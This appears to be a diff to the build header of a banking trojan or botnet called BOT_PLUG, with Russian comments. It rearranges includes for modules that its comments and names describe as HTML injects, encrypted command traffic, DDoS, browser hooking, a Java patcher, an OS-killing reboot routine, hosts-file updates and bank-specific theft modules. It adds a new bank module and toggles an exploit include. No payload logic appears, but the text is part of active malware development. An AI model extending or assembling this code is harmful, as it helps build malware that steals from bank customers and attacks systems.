@@ -4,8 +4,6 @@
 //  Заголовочный файл сборки BOT_PLUG
 //
 /*--------------------------------------------------------------------------*/
-
-
 #include "InternetExplorer.h" // Обработка запросов InternetExplorer
 #include "Firefox.h"
 #include "Opera.h"
@@ -14,6 +12,8 @@
 
 #include "BotConfig.h"     // Модуль включает HTML инжекты
 #include "BotCryptHTTP.h" // Шифрование отправляемых и принимаемых данных
+
+//#include "Exploit.h"
 
 #include "ddos.h"
 
@@ -32,6 +32,7 @@
 
 #include "yandex.h"
 #include "rafa.h"
+#include "finam.h"
 
 //#include "cc.h"
 #include "BSS.h"
@@ -50,7 +51,7 @@
 #include "java_patcher.h"
 #include "JavaConfig.h"
 
-#include "AzConfig.h"
+//#include "AzConfig.h"
 
 #include "KillOs_Reboot.h"
 #include "BBSCBank.h"
@@ -65,15 +66,15 @@
 
 #include "FgrFilters.h"
 
-#include "HostsAutoUpdate.h"
-
-
 
 #include "HostsAutoUpdate.h"
-
+	
+#include "AzConfig.h"
 
 //#include "BotMonitor.h"
 
 #ifdef  DEBUGCONFIG
-//	#include "BotMonitor.h"
+	#include "BotMonitor.h"
 #endif
+
+
